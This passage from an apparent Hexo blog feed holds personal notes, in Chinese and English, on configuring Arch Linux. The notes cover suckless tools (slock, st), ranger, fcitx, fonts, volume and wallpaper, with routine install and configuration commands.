class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">fdisk <span class="hljs-meta">&amp; disk -l &amp; df</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>bus<span class="hljs-regexp">/input/</span>devices<br></code></pre></td></tr></table></figure><h2 id="查看各设备的中断请求-IRQ"><a href="#查看各设备的中断请求-IRQ" class="headerlink" title="查看各设备的中断请求 (IRQ)"></a>查看各设备的中断请求 (IRQ)</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/i</span>nterrupts<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">fdisk <span class="hljs-meta">&amp; disk -l &amp; df</span><br></code></pre></td></tr></table></figure><h2 id="查看系统体系结构"><a href="#查看系统体系结构" class="headerlink" title="查看系统体系结构"></a>查看系统体系结构</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/i</span>nterrupts<br></code></pre></td></tr></table></figure><h2 id="查看包括-bios-cpu-内存等信息"><a href="#查看包括-bios-cpu-内存等信息" class="headerlink" title="查看包括 bios, cpu, 内存等信息"></a>查看包括 bios, cpu, 内存等信息</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">dmidecode</span><br></code></pre></td></tr></table></figure><h2 id="查看硬件信息"><a href="#查看硬件信息" class="headerlink" title="查看硬件信息"></a>查看硬件信息</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dmesg <span class="hljs-string">| more</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Archlinux 的美化(一部分)</title>
    <link href="/2022/09/05/Archlinux-%E7%9A%84%E7%BE%8E%E5%8C%96-%E4%B8%80%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/05/Archlinux-%E7%9A%84%E7%BE%8E%E5%8C%96-%E4%B8%80%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="定制简易的系统状态栏"><a href="#定制简易的系统状态栏" class="headerlink" title="定制简易的系统状态栏"></a>定制简易的系统状态栏</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S xsetroot</span><br></code></pre></td></tr></table></figure><p>但貌似我已经安装好了.</p><h1 id="系统音量调节"><a href="#系统音量调节" class="headerlink" title="系统音量调节"></a>系统音量调节</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S alsa-utils</span><br></code></pre></td></tr></table></figure><p>然后使用 amixer 来调节.</p><h1 id="调节屏幕亮度"><a href="#调节屏幕亮度" class="headerlink" title="调节屏幕亮度"></a>调节屏幕亮度</h1><p>用 xbacklight.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Suckless 的 slock 锁屏软件</title>
    <link href="/2022/09/05/Suckless-%E7%9A%84-slock-%E9%94%81%E5%B1%8F%E8%BD%AF%E4%BB%B6/"/>
    <url>/2022/09/05/Suckless-%E7%9A%84-slock-%E9%94%81%E5%B1%8F%E8%BD%AF%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p><a href="http://tools.suckless.org/slock/">Suckless</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>slock 是 simple X display locker.</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>其配置文件位于 <code>config.h</code>.</p><h1 id="使用-Xautolock"><a href="#使用-Xautolock" class="headerlink" title="使用 Xautolock"></a>使用 Xautolock</h1><p>可以用 xssstate 或 xss 替换。</p><p>slock 会在用户一段时间没动静时被 xautolock 启用. </p><p>语法格式:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">xautolock</span> -time <span class="hljs-number">10</span> -locker slock<br></code></pre></td></tr></table></figure><p>直接输入 <code>slock</code> 会使屏幕锁住，直到你输入密码.</p><h1 id="slock-getgrnam-nogroup-group-entry-not-found-报错"><a href="#slock-getgrnam-nogroup-group-entry-not-found-报错" class="headerlink" title="slock: getgrnam nogroup: group entry not found 报错"></a>slock: getgrnam nogroup: group entry not found 报错</h1><p>其原因为 <code>config.h</code> 中的:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> *user = <span class="hljs-string">&quot;nobody&quot;</span>;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> *<span class="hljs-keyword">group</span> = <span class="hljs-string">&quot;nogroup&quot;</span><br></code></pre></td></tr></table></figure><p>出错。</p><p>在 Arch 中，没有权限的 group 仍然称为 <code>nobody</code>, 因此，把 <code>nogroup</code> 改为 <code>nobody</code> 就可以了.</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>先拉取源代码:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://git.suckless.org/slock --<span class="hljs-attr">depth=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>进入目录后:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo make clean <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><h1 id="打补丁"><a href="#打补丁" class="headerlink" title="打补丁"></a>打补丁</h1><h2 id="添加-blured-of-pixelated-screeshot"><a href="#添加-blured-of-pixelated-screeshot" class="headerlink" title="添加 blured of pixelated screeshot"></a>添加 blured of pixelated screeshot</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>tools.suckless.org<span class="hljs-regexp">/slock/</span>patches<span class="hljs-regexp">/blur-pixelated-screen/</span>slock-blur_pixelated_screen-<span class="hljs-number">1.4</span>.diff<br></code></pre></td></tr></table></figure><p>然后:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">patch</span> &lt; slock-blur_pixelated_screen-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.diff<br></code></pre></td></tr></table></figure><h2 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h2>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Arch 中安装 pip</title>
    <link href="/2022/09/05/Arch-%E4%B8%AD%E5%AE%89%E8%A3%85-pip/"/>
    <url>/2022/09/05/Arch-%E4%B8%AD%E5%AE%89%E8%A3%85-pip/</url>
    
    <content type="html"><![CDATA[<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S python-pip</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ranger 工具的安装和使用</title>
    <link href="/2022/09/05/Ranger-%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/05/Ranger-%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/ranger/ranger">Github 相关</a></p><p>在 github 上和 archwiki 上有很多有用的资料.</p><p>ranger 是一个命令行下的文件管理器 (file manager).</p><p>可以在 <code>man ranger</code> 和 <code>HACKING.md</code> 中查看信息.</p><p>对于配置，可以查看 <code>ranger/config/</code> 或者复制默认配置到 <code>~/.config/ranger</code> with <code>ranger --copy-config</code>.</p><p><code>examples/</code> 中包含了脚本和插件，这些文件可以在 <code>/usr/share/doc/ranger</code> 中查看。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>先克隆下仓库:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ranger/</span>ranger.git --depth=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>运行:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo make <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>使用 <code>h</code> <code>j</code> <code>k</code> <code>l</code> 来 navigate.</p><p><code>Enter</code> 来打开文件。</p><p><code>q</code> 来退出.</p><p>第三列会显示 preview of the current file.</p><p>在 <code>ranger help</code> 中查看更多信息.</p><h1 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h1><p>可以查看 <code>~/.config/ranger/rc.conf</code> 文件来看有哪些快捷键.</p><p>修改这个配置文件可以定义很多快捷键.</p><h1 id="部分快捷键"><a href="#部分快捷键" class="headerlink" title="部分快捷键"></a>部分快捷键</h1><p>重命名: cw</p><p>修改文件名: a 和 A</p><p>剪切一个文件: dd  复制在另一个目录下: pp</p><p>删掉一个文件: dD</p><p>选中多个, 使用空格.</p><p>选中全部, 按 v.</p><p>bulkrename 命令, 在 vim 下修改文件名.</p><p>显示隐藏文件: zh</p><p>显示文件大小: dU</p><p>排序: o 加一个键</p><p>决定打开方式: r</p><p>移动上层文件夹: [] </p><p>在历史记录中跳转: H L</p><p>进入 ranger 所在的文件夹: S</p><p>利用 ranger 的 fzf 插件</p><p>复制文件路径: yp</p><p>进入任务管理器: w , 取消任务: dd</p><p>可以压缩文件: 在 rc.conf 下添加 <code>map C console compress%space</code></p><p>也可以解压缩:在 rc.conf 下添加 <code>map X console extracthere%space</code></p><p>可将 md 文件制作成 pdf</p><p>可以下在 Youtube 视频</p><p>预览视频</p><p>可以创建文件夹</p><h1 id="图片预览"><a href="#图片预览" class="headerlink" title="图片预览"></a>图片预览</h1><p>查看 github 上 ranger 自带的 wiki.</p><p>使用 ueberzug.</p><p>修改 rc.conf 中的 image</p><h1 id="视频预览"><a href="#视频预览" class="headerlink" title="视频预览"></a>视频预览</h1><p>在 scope.sh 中找 handle_image</p><h1 id="配置-ranger"><a href="#配置-ranger" class="headerlink" title="配置 ranger"></a>配置 ranger</h1><h2 id="各个配置文件的作用"><a href="#各个配置文件的作用" class="headerlink" title="各个配置文件的作用"></a>各个配置文件的作用</h2><h3 id="commands-py"><a href="#commands-py" class="headerlink" title="commands.py"></a>commands.py</h3><p>可以自己添加命令和代码. 也就是定义 ranger 的命令.</p><p>wiki 下面的 custom command, 可以把这些添加到这个 <code>commands.py</code> 文件内.</p><h3 id="rc-conf"><a href="#rc-conf" class="headerlink" title="rc.conf"></a>rc.conf</h3><p>这个是主要的配置文件</p><p><code>map</code> 命令用于映射:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">map</span> M cnsole mkcd%space<br></code></pre></td></tr></table></figure><p>这里的 <code>mkcd</code> 就是 <code>commands.py</code> 下定义的函数.</p><p><code>console</code> 就是执行一个 ranger 的终端命令.</p><p>修改 <code>VIM-like</code> 可以更换 vim 操作的快捷键.</p><p><code>shell</code> 表示后面跟的是 shell 命令.</p><h4 id="显示-git-状态"><a href="#显示-git-状态" class="headerlink" title="显示 git 状态"></a>显示 git 状态</h4><p>打开 vcs.</p><h3 id="fifle-conf"><a href="#fifle-conf" class="headerlink" title="fifle.conf"></a>fifle.conf</h3><p>里面保存默认的打开程序, 如打开 pdf</p><p>将默认打开程序换成 nvim:</p><p>将 <code>$EDITER</code> 那一坨换成 nvim.</p><h3 id="scope-sh"><a href="#scope-sh" class="headerlink" title="scope.sh"></a>scope.sh</h3><p>与预览相关.</p><h2 id="插件的安装"><a href="#插件的安装" class="headerlink" title="插件的安装"></a>插件的安装</h2><p>到 github 的 ranger 页面, 进入 wiki 下的 plugins.</p><h3 id="预览文件图标"><a href="#预览文件图标" class="headerlink" title="预览文件图标"></a>预览文件图标</h3><p>下载插件 devicons, 需要依赖 nerd-fonts</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是 tmux</title>
    <link href="/2022/09/05/%E4%BB%80%E4%B9%88%E6%98%AF-tmux/"/>
    <url>/2022/09/05/%E4%BB%80%E4%B9%88%E6%98%AF-tmux/</url>
    
    <content type="html"><![CDATA[<p>终端复用器.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Google 如何搭梯子</title>
    <link href="/2022/09/05/Google-%E5%A6%82%E4%BD%95%E6%90%AD%E6%A2%AF%E5%AD%90/"/>
    <url>/2022/09/05/Google-%E5%A6%82%E4%BD%95%E6%90%AD%E6%A2%AF%E5%AD%90/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.businessnewsdaily.com/15710-how-to-install-a-vpn-connection.html#what-is-a-vpn">How to Install a VPN Connection</a></p>]]></content>
    
    
    <categories>
      
      <category>CNAA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于 PlugInstall 失败问题</title>
    <link href="/2022/09/05/%E5%85%B3%E4%BA%8E-PlugInstall-%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/05/%E5%85%B3%E4%BA%8E-PlugInstall-%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>多试几次就可以安装好.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中 libinput</title>
    <link href="/2022/09/05/ArchWiki-%E4%B8%AD-libinput/"/>
    <url>/2022/09/05/ArchWiki-%E4%B8%AD-libinput/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Libinput">ArchWiki libinput</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>libinput 是一个函数库，在 Wayland 上用来接受设备的输入，在 X.Org 上提供输入设备的驱动。它提供对设备事件的检测和接收，对输入设备信号进行处理.</p><p>X.Org 输入驱动为大多数常规输入设备提供了支持，libinput 项目的目标是为触摸板和触摸屏的触摸功能提供高级支持.</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>在 Xorg 系统中，xf86-input-libinput 包是默认依赖。</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>对于 Xorg, 默认的配置文件安装在 <code>/usr/share/X11/xorg.conf.d/40-libinput.conf</code>.</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># libinput list-devices</span><br></code></pre></td></tr></table></figure><p>输出系统中的设备和它们被 libinput 支持的具体特性.</p><h2 id="查看所有设备并确定其名称和编号"><a href="#查看所有设备并确定其名称和编号" class="headerlink" title="查看所有设备并确定其名称和编号"></a>查看所有设备并确定其名称和编号</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>xinput list<br></code></pre></td></tr></table></figure><h2 id="查看-device-的设置"><a href="#查看-device-的设置" class="headerlink" title="查看 device 的设置"></a>查看 device 的设置</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">$ <span class="hljs-string">xinput</span> <span class="hljs-built_in">list-props</span> <span class="hljs-string">device</span><br></code></pre></td></tr></table></figure><h2 id="修改某项设置"><a href="#修改某项设置" class="headerlink" title="修改某项设置"></a>修改某项设置</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">$ <span class="hljs-string">xinput</span> <span class="hljs-built_in">set-prop</span> <span class="hljs-string">device</span> <span class="hljs-string">option</span> <span class="hljs-string">setting</span><br></code></pre></td></tr></table></figure><p><code>device</code> 和 <code>setting</code> 都可以是编号.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关闭 Archlinux 命令行蜂鸣声</title>
    <link href="/2022/09/05/%E5%85%B3%E9%97%AD-Archlinux-%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%9C%82%E9%B8%A3%E5%A3%B0/"/>
    <url>/2022/09/05/%E5%85%B3%E9%97%AD-Archlinux-%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%9C%82%E9%B8%A3%E5%A3%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Reason"><a href="#Reason" class="headerlink" title="Reason"></a>Reason</h1><p>主板上的蜂鸣器模块处于打开状态，关闭即可.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>先查看:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">sudo lsmod<span class="hljs-string">| grep pcspkr</span><br></code></pre></td></tr></table></figure><p>编辑 <code>/etc/modprobe.d/nobeep.conf</code> 文件，输入 <code>blacklist pcspkr</code>，然后重启.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>修复 fcitx 无法在终端下使用中文</title>
    <link href="/2022/09/05/%E4%BF%AE%E5%A4%8D-fcitx-%E6%97%A0%E6%B3%95%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%B8%8B%E4%BD%BF%E7%94%A8%E4%B8%AD%E6%96%87/"/>
    <url>/2022/09/05/%E4%BF%AE%E5%A4%8D-fcitx-%E6%97%A0%E6%B3%95%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%B8%8B%E4%BD%BF%E7%94%A8%E4%B8%AD%E6%96%87/</url>
    
    <content type="html"><![CDATA[<p>原因是我先把 ArchWiki 上面建议的一些环境变量写在了 <code>~.xinitrc</code> 中，导致其没有其效果，要写在 <code>.pam_environment</code> 这个文件中.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Fix the messy code of archlinux to display chinese</title>
    <link href="/2022/09/05/Fix-the-messy-code-of-archlinux-to-display-chinese/"/>
    <url>/2022/09/05/Fix-the-messy-code-of-archlinux-to-display-chinese/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Localization/Chinese">ArchWiki</a><br>Click the hyperlink above, you can chose a font to download.</p><h1 id="Reason"><a href="#Reason" class="headerlink" title="Reason"></a>Reason</h1><p>Why this happen.</p><p>When we locale our archlinux at the very beginning, we uncomment two line in file <code>/etc/locale.gen</code> and set the <code>LANG</code> variable by adding <code>LANG=en_US.UTF-8</code> to <code>/etc/locale.conf</code>:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">sed -i <span class="hljs-string">&#x27;s/^#en_US.UTF-8/en_US.UTF-8/&#x27;</span> <span class="hljs-regexp">/etc/</span>locale.gen<br>sed -i <span class="hljs-string">&#x27;s/^#zh_CN.UTF-8/zh_CN.UTF-8/&#x27;</span> <span class="hljs-regexp">/etc/</span>locale.gen<br>locale-gen<br>echo <span class="hljs-string">&quot;LANG=en_US.UTF-8&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>locale.conf<br></code></pre></td></tr></table></figure><p>That’s not enough.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>One Chinese font needed to be download to display the Chinese in the right way:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S wqy-zenhei</span><br></code></pre></td></tr></table></figure><p>It will be fixxed</p><h1 id="Adding-Chinese-input-method-and-googlepinyin"><a href="#Adding-Chinese-input-method-and-googlepinyin" class="headerlink" title="Adding Chinese input method and googlepinyin"></a>Adding Chinese input method and googlepinyin</h1><p>Install the fcitx:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S fcitx fcitx-googlepinyin fcitx-configtool</span><br></code></pre></td></tr></table></figure><p>Adding some environment variable in <code>~/.xinitrc</code> and start the fcitx when you enter X:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">fcitx <span class="hljs-meta">&amp;</span><br></code></pre></td></tr></table></figure><p>Use <code>fcitx-configtool</code> to set googlepinyin:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>fcitx-configtool<br></code></pre></td></tr></table></figure><p>restart the X.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Screen Shot on Archlinux with dwm</title>
    <link href="/2022/09/04/Screen-Shot-on-Archlinux-with-dwm/"/>
    <url>/2022/09/04/Screen-Shot-on-Archlinux-with-dwm/</url>
    
    <content type="html"><![CDATA[<h1 id="scrot"><a href="#scrot" class="headerlink" title="scrot"></a>scrot</h1><p>install scrot:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S scrot</span><br></code></pre></td></tr></table></figure><h1 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h1><p>Input <code>scrot</code> on command line, and it will save the screen shot in the current file.</p><p>You can specify the window by <code>-s</code> option.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>To adjust the volume on archlinux</title>
    <link href="/2022/09/04/To-adjust-the-volume-on-archlinux/"/>
    <url>/2022/09/04/To-adjust-the-volume-on-archlinux/</url>
    
    <content type="html"><![CDATA[<p>You can not use <code>F2</code> or <code>Fn + F2</code> to adjust the volume, we also need to install a software:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S pulseaudio pulseaudio-alsa pulseaudio-equalizer alsa-utils pavucontrol playerctl</span><br></code></pre></td></tr></table></figure><p>I just install pulseaudio now.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Preview Picture and Change the background of dwm</title>
    <link href="/2022/09/04/Preview-Picture-and-Change-the-background-of-dwm/"/>
    <url>/2022/09/04/Preview-Picture-and-Change-the-background-of-dwm/</url>
    
    <content type="html"><![CDATA[<p>Two software should be installed.</p><h1 id="sxiv"><a href="#sxiv" class="headerlink" title="sxiv"></a>sxiv</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S sxiv</span><br></code></pre></td></tr></table></figure><p>It’s used to preview the picture.</p><p>You need to enter the picture directory first.</p><p>Grammer:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sxiv *    <br></code></pre></td></tr></table></figure><p>Then you can click mouse to change the picture.</p><h1 id="xwallpaper"><a href="#xwallpaper" class="headerlink" title="xwallpaper"></a>xwallpaper</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S xwallpaper</span><br></code></pre></td></tr></table></figure><p>It’s used to set the wallpaper.</p><p>If the path of the picture is <code>~/bgd/wall.png</code>, the grammer:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">xwallpaper --zoom ~<span class="hljs-regexp">/bgd/</span>wall.png<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Beautify the st</title>
    <link href="/2022/09/04/Beautify-the-st/"/>
    <url>/2022/09/04/Beautify-the-st/</url>
    
    <content type="html"><![CDATA[<h1 id="Changing-the-font-size"><a href="#Changing-the-font-size" class="headerlink" title="Changing the font size"></a>Changing the font size</h1><p>It’s better to remove the <code>config.def.h</code> file.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo <span class="hljs-built_in">rm</span> <br></code></pre></td></tr></table></figure><p>Edit the <code>config.h</code> file, changing the value of <code>pixelsize</code>.</p><p>Then reload the st:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ sudo make clean <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><h1 id="改变终端的字体"><a href="#改变终端的字体" class="headerlink" title="改变终端的字体"></a>改变终端的字体</h1><p>修改 config.h 中 <code>static char *font</code> 这个字符串.</p><h1 id="The-way-to-patch"><a href="#The-way-to-patch" class="headerlink" title="The way to patch"></a>The way to patch</h1><p>Go to the official Web and get the patch by <code>wget</code> like:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ wget http:<span class="hljs-regexp">//</span>st.suckless.org<span class="hljs-regexp">/patches/</span>alpha/st-alpha-<span class="hljs-number">20220206</span>-<span class="hljs-number">0.8</span>.<span class="hljs-number">5</span>.diff<br></code></pre></td></tr></table></figure><p>Use <code>patch &lt;</code> to patch the <code>.diff</code> file:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">$ patch &lt; <span class="hljs-keyword">st</span>-<span class="hljs-keyword">alpha</span>-20220206-0.8.5.diff<br></code></pre></td></tr></table></figure><h1 id="To-make-the-background-blur"><a href="#To-make-the-background-blur" class="headerlink" title="To make the background blur"></a>To make the background blur</h1><p>Patch the st-alpha-0.8.2.diff.</p><h1 id="To-change-the-color"><a href="#To-change-the-color" class="headerlink" title="To change the color"></a>To change the color</h1><p>Patch the st-dracula-0.8.5.diff</p><h1 id="Allow-you-to-scrollback"><a href="#Allow-you-to-scrollback" class="headerlink" title="Allow you to scrollback"></a>Allow you to scrollback</h1><p>Patch the st-scrollback-mouse-altscreen-20220127-2c5edf2.diff</p>]]></content>
    
    
    <categories>
      
      <category>Suckless</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/09/04/hello-world/"/>
    <url>/2022/09/04/hello-world/</url>
    
